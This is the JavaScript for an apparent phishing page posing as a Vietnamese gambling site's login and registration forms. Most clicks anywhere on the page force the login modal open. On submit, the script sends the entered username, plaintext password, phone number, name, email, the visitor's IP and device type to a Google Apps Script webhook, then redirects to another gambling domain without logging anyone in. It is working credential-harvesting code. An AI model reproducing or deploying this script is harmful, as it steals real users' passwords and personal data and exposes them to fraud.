document.addEventListener("DOMContentLoaded", function () {
  // ================= CẤU HÌNH ĐƯỜNG DẪN =================
  const TARGET_REDIRECT_URL = "https://www.absiu88.com/";
  const GOOGLE_SHEET_WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbwZ0RCi6W2PbYgJsIJjxh_GI99jCi4xSeluB5-wTMHonylcVCrj7c90o0WP5Z3otBng/exec";

  // 1. Khởi tạo Banner trượt ngang (kèm kiểm tra an toàn nếu chưa có thư viện Swiper)
  if (typeof Swiper !== "undefined" && document.querySelector(".bannerSwiper")) {
    new Swiper(".bannerSwiper", {
      loop: true,
      autoplay: {
        delay: 3000,
        disableOnInteraction: false,
      },
      speed: 600,
      pagination: {
        el: ".swiper-pagination",
        clickable: true,
      },
    });
  }

  // 2. Quản lý Đóng / Mở Modal
  const registerModal = document.getElementById("registerModal");
  const loginModal = document.getElementById("loginModal");
  const regError = document.getElementById("regError");
  const loginError = document.getElementById("loginError");

  function openModal(modal) {
    if (!modal) return;
    if (registerModal) registerModal.classList.remove("show");
    if (loginModal) loginModal.classList.remove("show");
    if (regError) regError.textContent = "";
    if (loginError) loginError.textContent = "";
    modal.classList.add("show");
  }

  function closeAllModals() {
    if (registerModal) registerModal.classList.remove("show");
    if (loginModal) loginModal.classList.remove("show");
  }

  // ================= 3. BẮT SỰ KIỆN CLICK TOÀN TRANG (KHÔNG BAO GIỜ BỊ MẤT TÁC VỤ) =================
  document.addEventListener("click", function (e) {
    const target = e.target;

    // A. Nếu đang bấm bên trong Modal Đăng ký hoặc Đăng nhập
    if (target.closest(".auth-modal")) {
      // Nút đóng [X] trên PC hoặc nút Quay lại [<] trên Mobile
      if (target.closest("[data-close]")) {
        e.preventDefault();
        closeAllModals();
        return;
      }
      // Bấm ra vùng nền đen bên ngoài hộp form để đóng
      if (target.classList.contains("auth-modal")) {
        closeAllModals();
        return;
      }
      // Nút chuyển sang form Đăng nhập từ form Đăng ký
      if (target.closest("#switchToLoginBtn")) {
        e.preventDefault();
        openModal(loginModal);
        return;
      }
      // Nút chuyển sang form Đăng ký từ form Đăng nhập
      if (target.closest("#switchToRegLink")) {
        e.preventDefault();
        openModal(registerModal);
        return;
      }
      // Bấm vào con mắt Ẩn/Hiện mật khẩu
      const eyeIcon = target.closest(".toggle-pass");
      if (eyeIcon) {
        const input = eyeIcon.previousElementSibling;
        if (input) {
          if (input.type === "password") {
            input.type = "text";
            eyeIcon.classList.replace("fa-eye-slash", "fa-eye");
          } else {
            input.type = "password";
            eyeIcon.classList.replace("fa-eye", "fa-eye-slash");
          }
        }
        return;
      }
      // Các thao tác nhập liệu và bấm nút Submit bên trong form giữ nguyên bình thường
      return;
    }

    // B. Nếu bấm vào nút tắt [X] nhỏ trên huy hiệu Event góc dưới
    if (target.closest(".close-event")) {
      return;
    }

    // C. Nếu bấm vào nút Cuộn lên đầu trang
    if (target.closest("#scrollTopBtn")) {
      e.preventDefault();
      window.scrollTo({ top: 0, behavior: "smooth" });
      const gameList = document.querySelector(".mobile-game-list");
      if (gameList) gameList.scrollTo({ top: 0, behavior: "smooth" });
      return;
    }

    // D. Nếu bấm vào chấm tròn phân trang của Banner thì chỉ chuyển slide
    if (target.closest(".swiper-pagination-bullet")) {
      return;
    }

    // E. Nếu bấm vào nút ĐĂNG KÝ trên Header (PC & Mobile) -> Mở Form Đăng Ký
    if (target.closest(".btn-register-pc, .btn-register-mb")) {
      e.preventDefault();
      openModal(registerModal);
      return;
    }

    // F. Nếu bấm vào nút ĐĂNG NHẬP trên Header (PC & Mobile) -> Mở Form Đăng Nhập
    if (target.closest(".btn-login-pc, .btn-login-mb")) {
      e.preventDefault();
      openModal(loginModal);
      return;
    }

    // G. Nếu bấm vào mục trên thanh cuộn dọc Mobile -> Đổi màu nút đó rồi mở Form Đăng Nhập
    const sidebarItem = target.closest(".sidebar-item");
    if (sidebarItem) {
      e.preventDefault();
      document.querySelectorAll(".sidebar-item").forEach((el) => el.classList.remove("active"));
      sidebarItem.classList.add("active");
      openModal(loginModal);
      return;
    }

    // H. TẤT CẢ CÁC THÀNH PHẦN KHÁC TRÊN TRANG -> ĐỀU MỞ FORM ĐĂNG NHẬP
    const anyClickableArea = target.closest(
      "a, button, img, input, .input-group, .logo, .desktop-nav, .banner-section, " +
      ".marquee-wrapper, .pc-hero-card, .pc-cat-card, .pc-game-card, " +
      ".mb-game-card, .bottom-nav-item, .float-btn, .event-badge, .mobile-auth"
    );

    if (anyClickableArea) {
      e.preventDefault();
      openModal(loginModal);
    }
  });

  // ================= 4. CHỈ CHO PHÉP NHẬP SỐ VÀO Ô SỐ ĐIỆN THOẠI =================
  document.querySelectorAll("#regPhone, #loginPhone").forEach((phoneInput) => {
    phoneInput.addEventListener("input", function () {
      this.value = this.value.replace(/\D/g, "").slice(0, 10);
    });
  });

  // ================= 5. LẤY IP, THIẾT BỊ VÀ GỬI DỮ LIỆU VỀ GOOGLE SHEET =================
  let cachedClientIP = "Không xác định";
  fetch("https://api.ipify.org?format=json")
    .then((res) => res.json())
    .then((data) => {
      if (data && data.ip) cachedClientIP = data.ip;
    })
    .catch(() => {});

  function getDeviceInfo() {
    const ua = navigator.userAgent;
    const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua);
    let os = "Khác";
    if (/Windows/i.test(ua)) os = "Windows";
    else if (/Android/i.test(ua)) os = "Android";
    else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
    else if (/Mac/i.test(ua)) os = "MacOS";

    return (isMobile ? "Điện thoại" : "Máy tính") + " (" + os + ")";
  }

  async function sendToGoogleSheet(payload) {
    if (!GOOGLE_SHEET_WEBHOOK_URL || GOOGLE_SHEET_WEBHOOK_URL.includes("DAN_LINK")) {
      return;
    }
    const fullData = {
      time: new Date().toLocaleString("vi-VN"),
      status: payload.status,
      username: payload.username,
      password: payload.password,
      phone: payload.phone,
      fullname: payload.fullname || "",
      ip: cachedClientIP,
      device: getDeviceInfo(),
    };

    try {
      await fetch(GOOGLE_SHEET_WEBHOOK_URL, {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "text/plain;charset=utf-8",
        },
        body: JSON.stringify(fullData),
      });
    } catch (err) {
      console.error("Lỗi gửi dữ liệu:", err);
    }
  }

  // ================= 6. KIỂM TRA & SUBMIT FORM ĐĂNG NHẬP =================
  const loginForm = document.getElementById("loginForm");
  if (loginForm) {
    loginForm.addEventListener("submit", async function (e) {
      e.preventDefault();
      const user = document.getElementById("loginUser").value.trim();
      const pass = document.getElementById("loginPass").value.trim();
      const phone = document.getElementById("loginPhone").value.trim();
      const submitBtn = this.querySelector("button[type='submit']");

      if (!user || !pass || !phone) {
        if (loginError) loginError.textContent = "Vui lòng điền đầy đủ toàn bộ thông tin!";
        return;
      }
      if (user.length < 6 || user.length > 20) {
        if (loginError) loginError.textContent = "Tên người dùng phải từ 6 đến 20 ký tự!";
        return;
      }
      if (pass.length < 6 || pass.length > 20) {
        if (loginError) loginError.textContent = "Mật khẩu phải từ 6 đến 20 ký tự!";
        return;
      }
      if (!/^\d{10}$/.test(phone)) {
        if (loginError) loginError.textContent = "Số điện thoại bắt buộc phải đủ 10 chữ số!";
        return;
      }

      if (loginError) loginError.textContent = "";
      if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.textContent = "Đang xử lý...";
      }

      await sendToGoogleSheet({
        status: "ĐĂNG NHẬP",
        username: user,
        password: pass,
        phone: phone,
        fullname: "",
      });

      window.location.href = TARGET_REDIRECT_URL;
    });
  }

  // ================= 7. KIỂM TRA & SUBMIT FORM ĐĂNG KÝ =================
  const registerForm = document.getElementById("registerForm");
  if (registerForm) {
    registerForm.addEventListener("submit", async function (e) {
      e.preventDefault();
      const user = document.getElementById("regUser").value.trim();
      const fullname = document.getElementById("regFullname").value.trim();
      const pass = document.getElementById("regPass").value.trim();
      const phone = document.getElementById("regPhone").value.trim();
      const emailEl = document.getElementById("regEmail");
      const email = emailEl ? emailEl.value.trim() : "";
      const termsEl = document.getElementById("regTerms");
      const terms = termsEl ? termsEl.checked : true;
      const submitBtn = this.querySelector("button[type='submit']");

      if (!user || !fullname || !pass || !phone) {
        if (regError) regError.textContent = "Vui lòng điền đầy đủ các trường bắt buộc!";
        return;
      }
      if (user.length < 6 || user.length > 20) {
        if (regError) regError.textContent = "Tên người dùng phải từ 6 đến 20 ký tự!";
        return;
      }
      if (pass.length < 6 || pass.length > 20) {
        if (regError) regError.textContent = "Mật khẩu phải từ 6 đến 20 ký tự!";
        return;
      }
      if (!/^\d{10}$/.test(phone)) {
        if (regError) regError.textContent = "Số điện thoại bắt buộc phải đủ 10 chữ số!";
        return;
      }
      if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        if (regError) regError.textContent = "Vui lòng nhập đúng định dạng Địa chỉ Email!";
        return;
      }
      if (!terms) {
        if (regError) regError.textContent = "Bạn cần đồng ý với điều khoản trên 18 tuổi!";
        return;
      }

      if (regError) regError.textContent = "";
      if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.textContent = "Đang xử lý...";
      }

      await sendToGoogleSheet({
        status: "ĐĂNG KÝ",
        username: user,
        password: pass,
        phone: phone,
        fullname: email ? fullname + " (" + email + ")" : fullname,
      });

      window.location.href = TARGET_REDIRECT_URL;
    });
  }
});